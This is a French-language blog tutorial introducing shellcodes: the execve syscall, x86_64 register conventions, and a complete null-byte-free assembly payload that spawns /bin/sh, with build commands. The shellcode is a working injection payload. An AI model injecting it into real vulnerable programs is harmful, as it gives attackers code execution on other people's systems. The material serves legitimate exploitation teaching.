---
title: "Introduction aux shellcodes"
date: 2026-05-20 12:00:00 +0200
categories: [Cybersécurité, Documentation]
tags: [pwn, mémoire, exploit]
---
# Introduction aux shellcodes

### 1. Principe et Fonctionnement

Un shellcode est une suite d'instructions machine injectées dans la mémoire d'un programme vulnérable. L'objectif est de forcer le kernel à exécuter ce code plutôt que le programme légitime.

Ce code exécute en général un interpréteur de commandes "/bin/sh", d'où son nom shellcode, mais il est aussi possible d'exécuter n'importe quel syscall que le kernel peut traduire.

##### En mémoire 

Afin que ce code soit exécuté, deux conditions doivent être réunies : 

* Le pointeur d'instruction (RIP en 64 bits) doit être redirigé vers l'adresse de début de notre shellcode.
* La zone mémoire dans lequel notre shellcode se situe doit être exécutable, c'est-à-dire qu'elle doit posséder la permission **Exécution** (x).

### 2. Les Syscalls

Comme mentionné précédemment, un shellcode peut exécuter n'importe quel **syscall** que le kernel peut traduire, ainsi il n'est pas possible d'utiliser des fonctions de haut niveau telles que printf() ou system() car celui-ci ne connaît pas leur adresse en mémoire. Ainsi un shellcode ne peut communiquer directement avec le noyau qu'au travers de ces syscalls.

Afin de lancer un shell sous Linux x86_64 (64-bits), nous utilisons le syscall **sys_execve** (numéro 59), ce numéro change selon l'architecture, il est donc important de vérifier chaque numéro via une table de syscalls lors de l'écriture ou l'exécution d'un shellcode. La convention d'appel, elle-même différente selon les architectures impose de remplir des registres spécifiques avant de déclencher le syscall :

| REGISTRE | ROLE                                              |                             VALEUR REQUISE POUR EXECVE                             |
| :------: | ------------------------------------------------- | :---------------------------------------------------------------------------------: |
|   RAX   | Numéro du Syscall                                |                                      59 (0x3b)                                      |
|   RDI   | 1er argument : Pointeur vers la chaîne "/bin/sh" | Adresse de "/bin/sh"(à ne pas confondre<br />avec l'ajout de la valeur uniquement) |
|   RSI   | 2e argument : Tableau d'arguments argv            |                                      0 (NULL)                                      |
|   RDX   | 3e argument : Tableau d'environnement envp        |                                      0 (NULL)                                      |

### 3. Ecriture du code (Assembleur)

La contrainte majeure d'un shellcode est la limitation voire l'interdiction des octets nuls (NULL bytes \x00). Ces octets nuls stoppent la lecture, ainsi si le programme vulnérable utilise une fonction comme read() (dans  la grande majorité des cas) ou strcpy(), alors celui-ci s'arrêtera de lire au premier 0x00 trouvé, coupant ainsi notre exploit.

Nous allons ainsi construire un simple code en assembleur permettant d'exécuter le syscall sys_execve qui nous permettra d'obtenir un shell sans utiliser d'octets nuls : 

```
section .text 
global _start

_start:
	;l'entiereté des registres sont xorés par eux-même car une valeur xorée à elle-même donne 0
	;Nous mettons donc tous les registres à 0 dans le cas ou le shellcode s'exécuterait au milieu
	;d'un programme, rax est aussi mis à 0 car la fonction read() stocke la taille de la chaîne
	;lue dans le registre rax.
	xor rax, rax 
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx

	mov rbx, 0x68732f2f6e69622f ;nous mettons la chaine "/bin//sh" afin de nous aligner dans rbx
				    ;qui sert pour le moment de registre de stockage.
	push rbx		    ;nous poussons "/bin//sh" tout en haut de la pile.
	mov [rsp + 8], rsi	    ;Afin de stopper la lecture de "/bin//sh", nous rajoutons
				    ;des \x00 via un registre totalement vide
	lea rdi, [rsp]		    ;Nous stockons l'adresse de rsp + 0 qui pointe vers "/bin//sh"
				    ;dans le registre RDI
	mov al, 59		    ;nous mettons le numéro de sys_execve dans la partie basse de RAX
				    ;afin d'éviter de gaspiller les 4 octets hauts de la partie haute
				    ;et les 2 octets haut de la partie basse.
	syscall			    ;syscall est une instruction servant à déclencher l'appel système
```

### Compilation et exécution du programme assembleur

Afin de compiler le programme et de le transformer un binaire, nous allons utiliser l'assembleur **nasm** (Netwide Assembler) qui est un compilateur spécifique pour le langage assembleur ainsi que **ld** (GNU Linker) qui est un éditeur de liens, celui-ci sert à définir le point d'entrée (_start) et agencer les instructions machines en mémoire.

`nasm -f elf64 shellcode.asm -o shellcode.o`

`ld shellcode.o -o shellcode`

`chmod +x shellcode`

Ainsi nous récupérons un binaire **shellcode** , une fois exécuté via la commande : 

`./shellcode`

Celui-ci ouvre un shell avec les permissions actuelles de l'utilisateur.
